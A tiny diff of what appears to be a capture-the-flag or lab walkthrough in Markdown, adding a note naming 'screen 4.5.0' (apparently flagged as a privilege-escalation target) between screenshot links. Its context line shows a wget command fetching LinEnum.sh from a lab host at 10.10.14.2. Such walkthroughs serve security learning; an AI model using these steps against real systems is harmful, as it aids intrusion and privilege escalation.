@@ -67,4 +67,7 @@ wget 10.10.14.2/LinEnum.sh
 ![image](https://user-images.githubusercontent.com/33616880/232672832-8c3e1108-d6fe-40e7-b4f0-84dce04e3aea.png)
 
 
+```
+screen 4.5.0
+```
 ![image](https://user-images.githubusercontent.com/33616880/232672860-72151f75-c0e3-46f7-ba0c-22f08b39ec86.png)
